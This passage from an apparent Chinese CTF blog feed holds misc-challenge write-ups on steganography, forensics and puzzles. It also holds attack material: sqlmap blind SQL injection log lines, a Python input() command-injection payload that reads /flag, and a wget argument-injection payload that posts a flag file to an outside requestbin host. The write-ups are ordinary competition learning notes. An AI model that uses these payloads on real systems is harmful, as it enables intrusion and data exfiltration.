192.168.0.1 - - [13/Oct/2018:12:38:14 +0000] &quot;GET /flag.php?user=hence%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28secret%20AS%20CHAR%29%2C0x20%29%20FROM%20haozi.secrets%20ORDER%20BY%20secret%20LIMIT%200%2C1%29%2C3%2C1%29%29%3D97--%20pZaF HTTP/1.1&quot; 200 327 &quot;-&quot; &quot;sqlmap/1.2#pip (http://sqlmap.org)&quot;
192.168.0.1 - - [13/Oct/2018:12:38:14 +0000] &quot;GET /flag.php?user=hence%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28secret%20AS%20CHAR%29%2C0x20%29%20FROM%20haozi.secrets%20ORDER%20BY%20secret%20LIMIT%200%2C1%29%2C4%2C1%29%29%3D103--%20pZaF HTTP/1.1&quot; 200 327 &quot;-&quot; &quot;sqlmap/1.2#pip (http://sqlmap.org)&quot;
192.168.0.1 - - [13/Oct/2018:12:38:14 +0000] &quot;GET /flag.php?user=hence%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28secret%20AS%20CHAR%29%2C0x20%29%20FROM%20haozi.secrets%20ORDER%20BY%20secret%20LIMIT%200%2C1%29%2C5%2C1%29%29%3D123--%20pZaF HTTP/1.1&quot; 200 327 &quot;-&quot; &quot;sqlmap/1.2#pip (http://sqlmap.org)&quot;
192.168.0.1 - - [13/Oct/2018:12:38:14 +0000] &quot;GET /flag.php?user=hence%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28secret%20AS%20CHAR%29%2C0x20%29%20FROM%20haozi.secrets%20ORDER%20BY%20secret%20LIMIT%200%2C1%29%2C6%2C1%29%29%3D109--%20pZaF HTTP/1.1&quot; 200 327 &quot;-&quot; &quot;sqlmap/1.2#pip (http://sqlmap.org)&quot;
192.168.0.1 - - [13/Oct/2018:12:38:14 +0000] &quot;GET /flag.php?user=hence%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28secret%20AS%20CHAR%29%2C0x20%29%20FROM%20haozi.secrets%20ORDER%20BY%20secret%20LIMIT%200%2C1%29%2C7%2C1%29%29%3D97--%20pZaF HTTP/1.1&quot; 200 327 &quot;-&quot; &quot;sqlmap/1.2#pip (http://sqlmap.org)&quot;
192.168.0.1 - - [13/Oct/2018:12:38:14 +0000] &quot;GET /flag.php?user=hence%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28secret%20AS%20CHAR%29%2C0x20%29%20FROM%20haozi.secrets%20ORDER%20BY%20secret%20LIMIT%200%2C1%29%2C8%2C1%29%29%3D121--%20pZaF HTTP/1.1&quot; 200 327 &quot;-&quot; &quot;sqlmap/1.2#pip (http://sqlmap.org)&quot;
192.168.0.1 - - [13/Oct/2018:12:38:14 +0000] &quot;GET /flag.php?user=hence%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28secret%20AS%20CHAR%29%2C0x20%29%20FROM%20haozi.secrets%20ORDER%20BY%20secret%20LIMIT%200%2C1%29%2C9%2C1%29%29%3D105--%20pZaF HTTP/1.1&quot; 200 327 &quot;-&quot; &quot;sqlmap/1.2#pip (http://sqlmap.org)&quot;
192.168.0.1 - - [13/Oct/2018:12:38:14 +0000] &quot;GET /flag.php?user=hence%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28secret%20AS%20CHAR%29%2C0x20%29%20FROM%20haozi.secrets%20ORDER%20BY%20secret%20LIMIT%200%2C1%29%2C10%2C1%29%29%3D121--%20pZaF HTTP/1.1&quot; 200 327 &quot;-&quot; &quot;sqlmap/1.2#pip (http://sqlmap.org)&quot;
192.168.0.1 - - [13/Oct/2018:12:38:14 +0000] &quot;GET /flag.php?user=hence%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28secret%20AS%20CHAR%29%2C0x20%29%20FROM%20haozi.secrets%20ORDER%20BY%20secret%20LIMIT%200%2C1%29%2C11%2C1%29%29%3D97--%20pZaF HTTP/1.1&quot; 200 327 &quot;-&quot; &quot;sqlmap/1.2#pip (http://sqlmap.org)&quot;
192.168.0.1 - - [13/Oct/2018:12:38:14 +0000] &quot;GET /flag.php?user=hence%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28secret%20AS%20CHAR%29%2C0x20%29%20FROM%20haozi.secrets%20ORDER%20BY%20secret%20LIMIT%200%2C1%29%2C12%2C1%29%29%3D104--%20pZaF HTTP/1.1&quot; 200 327 &quot;-&quot; &quot;sqlmap/1.2#pip (http://sqlmap.org)&quot;
192.168.0.1 - - [13/Oct/2018:12:38:14 +0000] &quot;GET /flag.php?user=hence%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28secret%20AS%20CHAR%29%2C0x20%29%20FROM%20haozi.secrets%20ORDER%20BY%20secret%20LIMIT%200%2C1%29%2C13%2C1%29%29%3D101--%20pZaF HTTP/1.1&quot; 200 327 &quot;-&quot; &quot;sqlmap/1.2#pip (http://sqlmap.org)&quot;
192.168.0.1 - - [13/Oct/2018:12:38:14 +0000] &quot;GET /flag.php?user=hence%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28secret%20AS%20CHAR%29%2C0x20%29%20FROM%20haozi.secrets%20ORDER%20BY%20secret%20LIMIT%200%2C1%29%2C14%2C1%29%29%3D105--%20pZaF HTTP/1.1&quot; 200 327 &quot;-&quot; &quot;sqlmap/1.2#pip (http://sqlmap.org)&quot;
192.168.0.1 - - [13/Oct/2018:12:38:14 +0000] &quot;GET /flag.php?user=hence%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28secret%20AS%20CHAR%29%2C0x20%29%20FROM%20haozi.secrets%20ORDER%20BY%20secret%20LIMIT%200%2C1%29%2C15%2C1%29%29%3D49--%20pZaF HTTP/1.1&quot; 200 327 &quot;-&quot; &quot;sqlmap/1.2#pip (http://sqlmap.org)&quot;
192.168.0.1 - - [13/Oct/2018:12:38:14 +0000] &quot;GET /flag.php?user=hence%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28secret%20AS%20CHAR%29%2C0x20%29%20FROM%20haozi.secrets%20ORDER%20BY%20secret%20LIMIT%200%2C1%29%2C16%2C1%29%29%3D57--%20pZaF HTTP/1.1&quot; 200 327 &quot;-&quot; &quot;sqlmap/1.2#pip (http://sqlmap.org)&quot;
192.168.0.1 - - [13/Oct/2018:12:38:14 +0000] &quot;GET /flag.php?user=hence%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28secret%20AS%20CHAR%29%2C0x20%29%20FROM%20haozi.secrets%20ORDER%20BY%20secret%20LIMIT%200%2C1%29%2C17%2C1%29%29%3D54--%20pZaF HTTP/1.1&quot; 200 327 &quot;-&quot; &quot;sqlmap/1.2#pip (http://sqlmap.org)&quot;
192.168.0.1 - - [13/Oct/2018:12:38:14 +0000] &quot;GET /flag.php?user=hence%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28secret%20AS%20CHAR%29%2C0x20%29%20FROM%20haozi.secrets%20ORDER%20BY%20secret%20LIMIT%200%2C1%29%2C18%2C1%29%29%3D53--%20pZaF HTTP/1.1&quot; 200 327 &quot;-&quot; &quot;sqlmap/1.2#pip (http://sqlmap.org)&quot;
192.168.0.1 - - [13/Oct/2018:12:38:14 +0000] &quot;GET /flag.php?user=hence%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28secret%20AS%20CHAR%29%2C0x20%29%20FROM%20haozi.secrets%20ORDER%20BY%20secret%20LIMIT%200%2C1%29%2C19%2C1%29%29%3D97--%20pZaF HTTP/1.1&quot; 200 327 &quot;-&quot; &quot;sqlmap/1.2#pip (http://sqlmap.org)&quot;
192.168.0.1 - - [13/Oct/2018:12:38:14 +0000] &quot;GET /flag.php?user=hence%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28secret%20AS%20CHAR%29%2C0x20%29%20FROM%20haozi.secrets%20ORDER%20BY%20secret%20LIMIT%200%2C1%29%2C20%2C1%29%29%3D101--%20pZaF HTTP/1.1&quot; 200 327 &quot;-&quot; &quot;sqlmap/1.2#pip (http://sqlmap.org)&quot;
192.168.0.1 - - [13/Oct/2018:12:38:14 +0000] &quot;GET /flag.php?user=hence%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28secret%20AS%20CHAR%29%2C0x20%29%20FROM%20haozi.secrets%20ORDER%20BY%20secret%20LIMIT%200%2C1%29%2C21%2C1%29%29%3D55--%20pZaF HTTP/1.1&quot; 200 327 &quot;-&quot; &quot;sqlmap/1.2#pip (http://sqlmap.org)&quot;
192.168.0.1 - - [13/Oct/2018:12:38:14 +0000] &quot;GET /flag.php?user=hence%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28secret%20AS%20CHAR%29%2C0x20%29%20FROM%20haozi.secrets%20ORDER%20BY%20secret%20LIMIT%200%2C1%29%2C22%2C1%29%29%3D53--%20pZaF HTTP/1.1&quot; 200 327 &quot;-&quot; &quot;sqlmap/1.2#pip (http://sqlmap.org)&quot;
192.168.0.1 - - [13/Oct/2018:12:38:14 +0000] &quot;GET /flag.php?user=hence%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28secret%20AS%20CHAR%29%2C0x20%29%20FROM%20haozi.secrets%20ORDER%20BY%20secret%20LIMIT%200%2C1%29%2C23%2C1%29%29%3D54--%20pZaF HTTP/1.1&quot; 200 327 &quot;-&quot; &quot;sqlmap/1.2#pip (http://sqlmap.org)&quot;
192.168.0.1 - - [13/Oct/2018:12:38:14 +0000] &quot;GET /flag.php?user=hence%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28secret%20AS%20CHAR%29%2C0x20%29%20FROM%20haozi.secrets%20ORDER%20BY%20secret%20LIMIT%200%2C1%29%2C24%2C1%29%29%3D57--%20pZaF HTTP/1.1&quot; 200 327 &quot;-&quot; &quot;sqlmap/1.2#pip (http://sqlmap.org)&quot;
192.168.0.1 - - [13/Oct/2018:12:38:14 +0000] &quot;GET /flag.php?user=hence%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28secret%20AS%20CHAR%29%2C0x20%29%20FROM%20haozi.secrets%20ORDER%20BY%20secret%20LIMIT%200%2C1%29%2C38%2C1%29%29%3D125--%20pZaF HTTP/1.1&quot; 200 327 &quot;-&quot; &quot;sqlmap/1.2#pip (http://sqlmap.org)&quot;
</code></pre>
<p>提取出来保存为data.txt，脚本解码处理</p>
<pre><code class="language-python">from urllib.parse import unquote

with open('./data.txt') as f:
    lines = f.readlines()
    for line in lines:
        line = unquote(line)
        line = line[line.find('))=')+3:line.find('--')]
        print(chr(int(line)),end=&quot;&quot;)
</code></pre>
<p>脚本的功能是读取每一条盲注的记录，并且url解码处理，使用find方法去掉无关的字符把flag输出出来</p>
<p><code>flag{mayiyahei1965ae7569}</code></p>
<h1 id="神秘压缩包">神秘压缩包</h1>
<p>解压，得到一个压缩包和一个txt，txt内容是base64转图片，得到解压密码：<code>asdfghjkl</code></p>
<p>解压得到160张二维码图片，使用<code>微微二维码</code>批量扫描生成一个excel，提取其中内容，都是0和1，二进制转字符串得到flag</p>
<h1 id="赢战2019">赢战2019</h1>
<p>下载附件，一个jpg，丢winhex看，正常尾巴，binwalk看有些图片，foremost出一张二维码，扫出:眉头一皱，发现这张图片没这么简单，stegsolve改滤镜看到flag</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[CTFWshow DJBCTF大吉杯 部分misc 复现]]></title>
        <id>http://ayanagi.fun/CTFshowDJB/</id>
        <link href="http://ayanagi.fun/CTFshowDJB/">
        </link>
        <updated>2021-01-25T06:47:29.000Z</updated>
        <content type="html"><![CDATA[<h1 id="十八般兵器">十八般兵器</h1>
<p>hint1: JPHS<br>
hint2:用notepad++打开试试？<br>
hint3:前十种兵器对应10进制，后八种兵器对应8进制<br>
附件是一个rar，解压密码在里面的描述<br>
解压之后里面是18张兵器的图片<br>
一开始复现的时候芙头芙脑的，按照了文件的顺序去排武器数字，这是第一个坎<br>
在题目描述中有正确的顺序：刀、枪、剑、戟、斧、钺、钩、叉、鞭、锏、锤、戈、镋、棍、槊、棒、矛、耙<br>
使用JPHS对18张图片解密，密文为空，解密后的18个文件分别丢进winhex，尾部都有一串数字，分两组全部写到记事本里，10进制转16进制，8进制转16进制，转换的过程中找了一些垃圾在线转换网站不支持大数，把我搞迷糊了，最后找到了个很好的在线进制转换，能解决js的大数精度问题，丢连接https://tool.lu/hexconvert/<br>
把两组16进制组合起来转换字符串</p>
<pre><code>flag{CTFshow_10_bA_Ban_b1ng_Q1}
</code></pre>
<h1 id="请问大吉杯的签到是在这里签吗">请问大吉杯的签到是在这里签吗</h1>
<p>附件1.png，一个二维码，扫了没什么信息，binwalk，得到2.png，扫，得知是岔路。继续binwalk，到了4.png没了，扫，走到了死胡同。回到2.png，stegsolve滤镜，又得到2幅不同的二维码，扫，都是一样的结果，当时没往下想，果断放弃。(其实是被签到题的200多个解和这道题的个位数个解认为它确实很难而劝退)<br>
把这两张二维码保存，使用imagecombine模式 第一个就是XOR就能发现猪圈密码<br>
直接出来了<img src="http://ayanagi.fun/post-images/1611664016810.png" alt="" loading="lazy"></p>
<h1 id="牛年大吉">牛年大吉</h1>
<p>hint1:不要格式化哟，看看引导扇区是不是丢东西了<br>
hint2:压缩包密码在图片文件头里<br>
一个vhd文件，使用R-Studio装载，恢复出一个7z和一个png<br>
png的文件头是<code>89504E47</code>直接得flag</p>
<h1 id="童话镇">童话镇</h1>
<p>hint1:离别<br>
hint2:思念<br>
hint3:爱<br>
hint4:印象<br>
先binwalk出一个zip，爆破得到2个txt，看不懂。看wp，第二个我遇到的机器学习题目，看来做misc的不会点机器学习还做不下去了。<br>
脚本是抄7月师傅的</p>
<pre><code class="language-python">import numpy as np
from sklearn.neighbors import KNeighborsClassifier
from ast import literal_eval
from PIL import Image
x_train = []
y_train = []
x_test = []
f1 = open(&quot;t.txt&quot;,&quot;r&quot;)
f2 = open(&quot;flag.txt&quot;,&quot;r&quot;)
while 1:
	s = f1.readline()
	if not s:
		break
	s = s.strip('\n')
	p1 = literal_eval(s.split(&quot;\t&quot;)[1])
	p2 = literal_eval(s.split(&quot;\t&quot;)[0])
	x_train.append(p1)
	x_test.append(p2)
	#print(x_train)
	#print(x_test)
while 1:
	s = f2.readline()
	if not s:
		break
	s = s.strip('\n')
	s = literal_eval(s)
	y_train.append(s)
	#print(y_train)
x_train = np.array(x_train)
y_train = np.array(y_train)
x_test = np.array(x_test)
 
clf = KNeighborsClassifier(n_neighbors = 1)
clf.fit(x_train, x_test)
y_test = clf.predict(y_train)
 
f3 = open(&quot;3.txt&quot;,&quot;w&quot;)
for i in y_test:
	f3.write(str(y_test[i]))
f3.close()
</code></pre>
<p>得到全是1和0的文本，继续抄脚本</p>
<pre><code class="language-python">from PIL import Image #import必要的库
fp = open(&quot;3.txt&quot;,&quot;r&quot;).read() #读取文本
pic = Image.new(&quot;L&quot;, (len(fp)//79, 79)) #创建一张图片叫做pic，mode是L，L代表8位像素，是黑白的，size属性是len(fp)//79,79，意思是宽度是len(fp)//79，也就是文本的长度整除79的结果，高度是79
i = 0 #定义一个计数的变量i
for y in range(79): #纵坐标从0到79进行循环,也就是从底部开始画起，绘制79单位的内容
	for x in range(len(fp)//79):#横坐标从0到len(fp)//79进行循环，也就是从左边开始画起，绘制len(fp)//79单位的内容
		if fp[i] == '0':#文本第i个字符如果是0
			pic.putpixel([x,y], 255)#那么pic这张图片就调用putpixel这个方法，在[x,y]这个坐标放置一个255颜色的像素，也就是白色
		else:#文本第i个字符如果不是0(其实非0即1)
			pic.putpixel([x,y], 0)#那么pic这张图片就调用putpixel这个方法，在[x,y]这个坐标放置一个0颜色的像素，也就是黑色
		i += 1#对这个字符的安置操作已经完成了，i增大1来准备对下一个字符进行操作。
pic.show()#完成上述循环后，图片已经画好，pic这张图片调用show这个方法，也就是显示在显示器上让用户看到。
</code></pre>
<p>机器学习可以留后再学，但是画图脚本还是得掌握一下，仔细解释了一下脚本。把python学成文科。只有我这么蠢的人才会这么学习吧。(PS:其中直接偷脚本在kali里跑最后图片show不出来，但是kali里又装好了库，我只能在windows下装库，用的pycharm装库就很难受，这题复现出来问题不大，但是装库的时候可让人抓狂了。)<br>
<code>flag{67373永生_举报狗必须死}</code></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[*CTF misc 部分复现]]></title>
        <id>http://ayanagi.fun/starctf/</id>
        <link href="http://ayanagi.fun/starctf/">
        </link>
        <updated>2021-01-24T05:25:17.000Z</updated>
        <content type="html"><![CDATA[<h1 id="signin">signin</h1>
<p>签到题，加入他们的telegram群组就能看到公告上的flag了，记得挂代理</p>
<h1 id="minegame">MineGame</h1>
<p>扫雷，需要有matlab环境才能打开，非预期解是CE的advance options暂停游戏，之后慢慢在内存里搜索*CTF的unicode编码，跟踪搜索到的地址就能找到flag。<br>
官方wp的预期解是写一个14秒内自动完成扫雷的脚本，对我而言一听就挺难的。</p>
<h1 id="puzzle">puzzle</h1>
<p><img src="http://ayanagi.fun/post-images/1611653792463.png" alt="" loading="lazy"><br>
图像是竖着25小格，用高度除以25，就得到每一小块是43像素，用宽度除以43就能得到44格，43*25=1100个小碎片。<br>
<img src="http://ayanagi.fun/post-images/1611653813577.png" alt="" loading="lazy"></p>
<pre><code>gaps --image puzzle.png --generations 30 --population 1100 --size 43 --verbose
</code></pre>
<p>generations是迭代的次数，一般是30，不过这题到了10代之后就不会再有变化了，verbose是让它保留每一代的结果让我们查看对比用的。<br>
(悄悄说一下这么跑是跑不出来的，得用ps改下对比度让图片上flag的墨渍更加凸显便于gaps认图，就不折腾了)</p>
<h1 id="littletricks">littletricks</h1>
<p>官方wp里没找到附件，只有文档<br>
看强队wp，这个是windows磁盘镜像，使用磁盘管理加载，解密bitlocker，使用bitcracker爆破或者弱口令社工，密码是12345678，打开后只找到一个password.txt<br>
用磁盘恢复软件例如DiskGenius或者R-Studio恢复，在$RECYCLE.BIN下能找到两个pdf文件，一个是假flag，另一个是真的。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[杭电0rays 2020招新赛Misc 复现]]></title>
        <id>http://ayanagi.fun/0raysCB2020/</id>
        <link href="http://ayanagi.fun/0raysCB2020/">
        </link>
        <updated>2021-01-22T14:44:12.000Z</updated>
        <content type="html"><![CDATA[<h1 id="test-your-nc">test your nc</h1>
<p>需要拥有shell的基础知识。当时是没有的，签到都出不来。<br>
nc上去之后ls<br>
<img src="http://ayanagi.fun/post-images/1611563190477.png" alt="" loading="lazy"><br>
之后发现输啥都不好使。<br>
看wp才知道用的是<code>echo</code>语句读取flag<br>
nc之后</p>
<pre><code>bash
for s in $(&lt;flag); do echo $s; done
</code></pre>
<h1 id="我要成为神奇宝贝带师">我要成为神奇宝贝带师</h1>
<p>下载gba模拟器，附件后缀要改成gba才能读取，随便玩了一通，其实没啥意思。地上比较突出的草丛就是flag的字母。<br>
使用口袋妖怪地图编辑器advancemap<br>
<img src="http://ayanagi.fun/post-images/1611564763642.png" alt="" loading="lazy"><br>
从3.0开始打开地图，(图中flag字母我已经涂黑处理)<br>
按顺序可以得到<code>I_LvPeo4mok</code><br>
需要自行结合hint：flag是15位，并调整位置使其可读。<br>
<code>I_Love_Pok4mo</code>，其实这个4蛮神秘的，因为pokemon的4位置其实是e字母。不太像是能用4代替的样子。组合完发现少2个，在几百张地图里找了n久，最后找到是在最后面<img src="http://ayanagi.fun/post-images/1611565058098.png" alt="" loading="lazy"><br>
挺脑洞的一道题，并不能学到什么。</p>
<h1 id="who-is-killer">who is killer</h1>
<p>下完附件丢winhex看，看不出什么。binwalk发现图里藏了一张图。分不出来，使用foremost分出来，一张密文图片，原图改宽高得到hint：z-340，google查询，得知是黄道十二宫杀手的密码，各种报道吹的玄乎得很，恰逢当时没什么想法做题，就没往下做了。<br>
通过wp学习到340是一个矩形信息，将密码分为3个部分，第一部分和第二部分为9行，最后一部分为2行。<br>
<img src="http://ayanagi.fun/post-images/1611565739291.png" alt="" loading="lazy"><br>
<img src="http://ayanagi.fun/post-images/1611569685804.png" alt="" loading="lazy"><br>
只要按照第一部分去做就行了。走法是：从第一个字符开始，图中为h，向下一格，向右两格，得到e，以此类推，走到最右下角的话就继续反复，又从左上角开始，最后一行的下一行是第一行，回到第一行；最右边一列的再右边两列是第二列，那么o的下一个字符是y，以此类推。<br>
<code>helloboysandgirlsiamzodicakillercongratulationonfindmethisisyourflagzpggisthefinallybigboss</code><br>
其实有个非预期也不用读这么多，直接找f以及下三个字母能组成flag的，以此为基础继续往下读就能减少很多工作量(不会写脚本是这样的了)</p>
<pre><code>flag{zpggisthefinallybigboss}
</code></pre>
<h1 id="verylow">verylow</h1>
<p>显然的b64转文件，解码后是504B开头，转成zip，解压出来一个woshishui文件，然后就不会了。wp说是将全文件反转后看到bmp的头，但是并没有说如何反转，难道就是16进制逆序？但其实不然，因为在winhex里看它的尾巴并不是逆序的bmp文件头，只好搁置。<br>
询问得知，反转意为让文件与FF异或，丢cyberchef处理。大厨yyds！得到一张bmp。首先要知道silenteye里有verylow解密，才能由题目名的verylow知道使用silenteye解出来</p>
<pre><code>flag{s1lent3ye_1s_s0_c00l}
</code></pre>
<h1 id="ic">IC</h1>
<p>两个dump文件，无从下手。<br>
前置知识：最普通的ic卡有16个扇区（0-15），每个扇区⼜分为4个区域块（0-63）， 每个扇区都有独<br>
⽴的⼀对密码keyA和keyB负责控制对每个扇区数据的读写操作，keyA和keyB分布在每个扇区<br>
的第四块中。第0扇区的第⼀个数据块，存储着IC卡的UID号，其他扇区可以存储其他的数据，<br>
如钱等数据。<br>
看wp，全丢进winhex里，在菜单里点查看→同步和比较<br>
<img src="http://ayanagi.fun/post-images/1611568315440.png" alt="" loading="lazy"><br>
根据题目描述，变动的东西肯定就是金额，分析后发现第⼀个⿊⾊块和第三个数值是相同的，实际上就是存的⾦额，这⾥需要稍微查阅些<br>
资料或者经验，⾦额再ic卡中⼀般是以分为单位，⼩端序存储，图示2.dump数据为8c6e，转<br>
换成0x6e8c，28300，也就是283元<br>
第⼆个⿊⾊块数值其实是第⼀个⿊⾊块数据的取反，8c6e取反为7391，这⾥⼀般是为了校验⽤<br>
同理按照上⾯的⾦额的校验⽅法，将第⼆个框内数据取反试试<br>
其实题目有些误导性，但也是没办法，芙头芙脑去做的话会把第一个块去取反，就拼不出来了，按wp描述就是将第二个块取反，最后拼出flag</p>
<pre><code>flag{Y0u_hAcK@d_H6Us_Sy5tEm}
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[2020纵横杯 Misc wp+复现]]></title>
        <id>http://ayanagi.fun/ZONGHENGCUP2020/</id>
        <link href="http://ayanagi.fun/ZONGHENGCUP2020/">
        </link>
        <updated>2020-12-30T02:40:16.000Z</updated>
        <content type="html"><![CDATA[<p>自己只出了签到题。</p>
<h1 id="签到">签到</h1>
<p>自己写的脚本，感觉蛮不错的。<br>
写了有一会儿。大概半小时(老菜了</p>
<pre><code class="language-python">s1 = [0o146, 0o154, 0o141, 0o147, 0o173, 0o167, 0o63, 0o154, 0o143, 0o157, 0o155, 0o145, 0o137, 0o164, 0o157, 0o137, 0o62, 0o157, 0o156, 0o147, 0o137, 0o150, 0o63, 0o156, 0o147, 0o137, 0o142, 0o145, 0o61, 0o175]
s2 = []
for i in range(len(s1)):
    s2 += [chr((s1[i]))]
for i in range(len(s2)):
    print(s2[i],end = '')

</code></pre>
<h1 id="my_secret">My_Secret</h1>
<p>当时拿到附件一通操作啥也没出来，放弃。<br>
通过强队wp复现：<br>
首先是lsb隐写，有专门的脚本，叫cloacked-pixel，由于寒假我回了家用台式机重新配的ctf环境，配这个配了好久</p>
<pre><code>python2 lsb.py extract stego.png out 123456
cat out
</code></pre>
<p>得到密码<code>38d668578a3686ab</code><br>
wav音频隐写的话常用的工具是deepsound，得到第二个密码<code>carrier</code>。学习了。<br>
接下来图片的加密，看天璇队的wp他们走了不少的弯路，其实无非就是拼积累一个个试呗。希望我能加快积累的速度。<br>
使用的是oursecret，一般人根本想不到。</p>
<h1 id="babymaze2_beta">babymaze2_beta</h1>
<p>该稍微学习一下如何使用nc了，直接下载附件操作会遇到各种各样的问题。nc的话就很方便。</p>
<pre><code>nc 182.92.203.154 10001
</code></pre>
<p>maze的界面要求的操作应该给的是input()函数，看wp学到一个input()的非预期输入，</p>
<pre><code class="language-python">__import__('os').system('ls /')
</code></pre>
<p>等价于</p>
<pre><code class="language-python">import os
os.system(&quot;ls /&quot;)
</code></pre>
<p>会ls出一系列文件，其中有flag，那么payload必然是</p>
<pre><code class="language-python">__import__('os').system('cat /flag')
</code></pre>
<h1 id="马赛克">马赛克</h1>
<p><code>https://github.com/beurtschipper/Depix</code><br>
将附件图片放进Depix文件夹下，在Depix文件夹里的images/searchimages里把debruinseq_notepad_Windows10_closeAndSpaced.png复制到Depix文件夹里，打开终端输入如下命令</p>
<pre><code>python3 depix.py -p mosaic.png -s debruinseq_notepad_Windows10_closeAndSpaced.png
</code></pre>
<p>跑了一会儿得到output.png，当时我读了好久没读出来那个关键的地方是什么字母，遍历试了可能性交上去也是wa，就很难受，最后还是没出。看wp的时候拍断大腿。但是隐约记得我输过a还是错了(?)<br>
<img src="http://ayanagi.fun/post-images/1611502957560.png" alt="" loading="lazy"></p>
<h1 id="magic_download">magic_download</h1>
<p><code>run.sh</code>文件内容如下<img src="http://ayanagi.fun/post-images/1611552245410.png" alt="" loading="lazy"><br>
代码的大意是读取你输入的ip，判断ip是否合法，合法后执行<code>./wget -P /tmp $IP</code>这条语句<br>
使用的是echo语句，那么就可以用-e参数来实现转义并且构造命令输入，传入\n来绕过ip的判断<br>
绕过后就可以传参到wget了<br>
环境已经关了，别人的wp payload如下<br>
<code>-e tries=20 --post-file=/home/ctf/flag http://http.requestbin.buuoj.cn/w9gw6tw9 \\n127.0.0.1</code></p>
<h1 id="问卷调查">问卷调查</h1>
<p>有手就行</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[DASCTF x BJD 12月圣诞狂欢赛Misc wp]]></title>
        <id>http://ayanagi.fun/DASxBJD1225/</id>
        <link href="http://ayanagi.fun/DASxBJD1225/">
        </link>
        <updated>2020-12-25T10:18:43.000Z</updated>
        <content type="html"><![CDATA[<h1 id="马老师的秘籍">马老师的秘籍</h1>
<p>一个靶机，一张几十个二维码的大图，随便扫了一个发现是mbg的语录其中3个字，一开始想弄下来切开一个个扫，以为flag就在这里面。但是太蠢了，所以果断把图片保存下来，是个png。丢winhex，好的，有压缩包，那么直接binwalk，在kali里打开压缩包是归档损坏状态，binwalk出来的两个txt文件都是空的，尝试把压缩包拿出windows查看，有三个文件，一个GoodLuck.txt，一个闪电五连鞭.txt，还有一个马老师的磁盘.jpg，压缩包带密码，尝试全部的伪加密，发现jpg是伪加密，图片长得和png几乎一样，然后有明显的需要处理的痕迹，其他俩带密码，jpg解压出来stegsolve和png异或，发现<img src="http://ayanagi.fun/post-images/1608891934024.png" alt="" loading="lazy"><br>
把NianQingRenBuJiangWuDe丢去md5加密，直觉是取32位小写</p>
<pre><code>c57988283c92f759585a0c1aebfdd743
</code></pre>
<p>将两个txt解压出来，一个内容是<img src="http://ayanagi.fun/post-images/1608892038946.jpg" alt="" loading="lazy"><br>
另一个内容是<img src="http://ayanagi.fun/post-images/1608892053512.jpg" alt="" loading="lazy"><br>
一看就知道是Ook，批量替换之</p>
<pre><code>DASCTF{f79f28f30232e26a2f51b6b75355afa9}
</code></pre>
<p>交了好几次发现都错了，一看公告发现不需要带上DASCTF{}。</p>
<h1 id="fakepic">FakePic</h1>
<p>下载下来是RAR文件，打开发现提示密码是1???，马上想到掩码爆破，但是是高版本加密，archpr无法爆破，rarcrack没爆出来就离谱，明明字典里面没错。随即找了另外的rar暴力软件，而且挺好用的：cRARk。<br>
password.def的内容如下：</p>
<pre><code>max=4
##
[$a $A $1] *
</code></pre>
<p>爆了十几分钟出来了，密码<code>1cpp</code>，解压，一个png，一个txt，hint看不懂。<img src="http://ayanagi.fun/post-images/1608892400404.jpg" alt="" loading="lazy"><br>
png用zsteg看，有些文件，也看不懂。<img src="http://ayanagi.fun/post-images/1608892514717.jpg" alt="" loading="lazy"><br>
但是有一行：<code>searchme_in_Alpha</code><br>
stegsolve打开，alpha7个滤镜，在最左边能看到一些类似摩斯电码的东西，<img src="http://ayanagi.fun/post-images/1608892742481.jpg" alt="" loading="lazy"><br>
当时我的表情就是这样的<img src="http://ayanagi.fun/post-images/1608893119131.jpg" alt="" loading="lazy">，<br>
图片旋转之后放大五倍，是这样的<img src="http://ayanagi.fun/post-images/1608893157633.jpg" alt="" loading="lazy">结合hint:10132430，<br>
可能是把这些码按照滤镜1 0 1 3 2 4 3 0的顺序抄下来排列，抄完之后解摩斯电码，不对，但是有一些类似url的转码字符。感觉又有希望，但是觉得又不像摩斯码，不知道是啥了，最后放弃，等官方wp。<br>
http://www.7yue.top/2020-dasctfbjd-miscwp/<br>
题目没了而且也懒得复现了，直接贴大师傅的wp。</p>
<h1 id="fakepixel">FakePixel</h1>
<p>下下来一个超大的压缩包，解压的bmp一张半个G，还有个enc.py的加密脚本，大眼一看，不会做，直接等wp。<br>
不过从大佬wp里学到了VBS的解密、maxicode、CitrixCTX1加密，以及相见恨晚的cyberchef工具，还有针对mp3的private_bit加密，都是没见过的新东西，在知识的海洋里乱游。</p>
<h1 id="总结">总结</h1>
<p>还要继续努力。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[SWPUCTF 2020-Misc WP]]></title>
        <id>http://ayanagi.fun/SWPU2020/</id>
        <link href="http://ayanagi.fun/SWPU2020/">
